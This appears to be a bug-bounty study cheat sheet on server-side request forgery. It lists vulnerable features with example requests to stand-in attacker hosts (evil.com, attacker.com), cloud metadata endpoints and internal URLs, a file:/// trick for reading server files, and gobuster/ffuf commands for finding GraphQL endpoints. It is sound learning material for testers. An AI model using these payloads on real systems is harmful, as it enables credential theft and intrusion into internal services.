SSRF Sources:
‚Ä¢  1- URL Fetching / Redirection:Description: When a web application allows users to input URLs or external links, and the server fetches resources from those URLs (e.g., an image, API, or file).

Example:
A URL shortener or image downloader that retrieves a file or content from a user-provided URL.

GET /download?url=https://external.com/file
Risk: Attackers can provide internal URLs or malicious external URLs to gain access to sensitive systems.

_________________________________________________________________________________________________________

‚Ä¢  2- Webhookes: Description: Webhooks allow external services to send requests to your server. These services can be vulnerable to SSRF if not properly filtered.

Example:
A webhook that triggers an internal API request or a system call whenever an event occurs externally.

{
  "event": "user_signup",
  "callback_url": "http://localhost:8080/internal-service"
}

Risk: Attackers can use webhooks to force the server to interact with internal services.

_________________________________________________________________________________________________________

‚Ä¢  3- File Uploader: File Uploaders (with URL Processing)
Description: When a server allows users to upload files and then process URLs (e.g., by downloading a file from a provided URL).

Example:
A file upload tool that retrieves content from a URL specified by the user (e.g., for fetching metadata, images, or files before processing the upload).

POST /upload
Content-Type: multipart/form-data
URL: https://evil.com/malicious.zip

Risk: The server may download a malicious file from an attacker-controlled URL or access internal services via URL-based exploitation.
_________________________________________________________________________________________________________
‚Ä¢  4- Open Redirection: Description: An open redirection vulnerability allows an attacker to redirect the server to an arbitrary location.

Example:
A URL parameter that redirects the server to a different location based on user input.

GET /redirect?url=https://attacker.com

Risk: Attackers can redirect the server to internal IPs or sensitive endpoints (e.g., http://localhost/admin).

_________________________________________________________________________________________________________
‚Ä¢  5- API Services: Description: APIs that interact with third-party services may expose SSRF if the server is able to make requests to arbitrary URLs.

Example:
An API that accepts a URL and fetches information from that URL to return to the client.

GET /api/lookup?url=http://example.com

Risk: Attackers could provide a malicious internal URL (e.g., http://localhost:8080/internal-api) to gain unauthorized access to internal services.

_________________________________________________________________________________________________________
‚Ä¢  6- Cloud Metadata Service: Description: Cloud services (AWS, Google Cloud, etc.) offer metadata services that return sensitive information like instance IDs, credentials, etc. SSRF can be exploited if the server accesses these metadata URLs without validation.

Example:
Fetching metadata from 169.254.169.254 (AWS, GCP, etc.) can expose instance metadata.

GET http://169.254.169.254/latest/meta-data/

Risk: Attackers can gain access to cloud metadata, potentially leaking API keys, instance data, or even credentials.

_________________________________________________________________________________________________________
‚Ä¢  7- Internal Services Accessed via HTTP Requests: Description: Services running on internal servers (e.g., databases, admin panels) that are accessible via HTTP may be vulnerable to SSRF if the server is configured to make HTTP requests.

Example:
A service might make requests to http://localhost/admin or http://127.0.0.1/secret.

GET /internal-service

Risk: Attackers can exploit internal services that are not properly protected.

_________________________________________________________________________________________________________

‚Ä¢  8- DNS Resolution Services: Description: Some applications resolve domain names using DNS requests. If the server is configured to resolve untrusted user-provided URLs, SSRF can be used to force DNS lookups to internal IP addresses.

Example:
A DNS lookup service that resolves user-supplied domains:

GET /dns?url=internal.com

Risk: Attackers can trick the server into resolving private IPs and internal services, potentially bypassing security.
  
_________________________________________________________________________________________________________
Exploit SSRF Via File Upload :
Consider we have request:

get /download.php?pdf_path=http://pdf.com/abc.pdf
host : books.com

here a web app books.com is sending request to another website to access a books

Now in order to exploit we are going to access their file server from this request
let's see how...

get /download.php?pdf_path=file:///any_Particuler_folder
host : books.com

the "file:///" protocol is used to access the files present in a machine in this case we are giving the server a path for pdf but trick is its not pdf path

_________________________________________________________________________________________________________
API requests that accept user-supplied URLs:

Suppose in a request or web app is asking to give api a user supplied url to fetch images, web pages or webhooks can be vulnerable

File Download APIs
GET /fetch?url=<user-supplied-URL>
GET /proxy?source=<user-supplied-URL>

Webhooks & Callbacks
POST /webhook { "callback_url": "http://attacker.com" }

Open Redirect APIs
GET /redirect?to=<user-supplied-URL>

Image Processing APIs
POST /image/convert { "image_url": "http://example.com/pic.jpg" }

PDF Generators & Screenshot APIs
POST /generate_pdf { "url": "http://example.com/page" }

OAuth & SSO Redirections
GET /oauth?redirect_uri=<user-controlled-URL>

Metadata Services in Cloud Environments
AWS: http://169.254.169.254/latest/meta-data/
GCP: http://metadata.google.internal/computeMetadata/v1/
Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01

_________________________________________________________________________________________________________

GraphQL Endpoints & Security Testing
üìå What is GraphQL?
GraphQL is an API query language that allows clients to request only the data they need, making it flexible and efficient. Unlike REST, where you get fixed responses from endpoints (/users, /posts), GraphQL lets you request multiple resources in a single query.

üîé How to Find GraphQL Endpoints?

1Ô∏è‚É£ Common GraphQL Endpoints
Most GraphQL implementations expose an endpoint like:

/graphql
/api/graphql
/graphql/console
/v1/graphql
/playground
/graphiql


2Ô∏è‚É£ Discovering GraphQL Endpoints

Use directory fuzzing to detect GraphQL endpoints:
gobuster dir -u https://target.com -w wordlist.txt -x php,html,json

or use ffuf:
ffuf -u https://target.com/FUZZ -w wordlist.txt

_________________________________________________________________________________________________________
Study bug bounty write-ups on SSRF (HackerOne, Bugcrowd):

https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPSSRF.md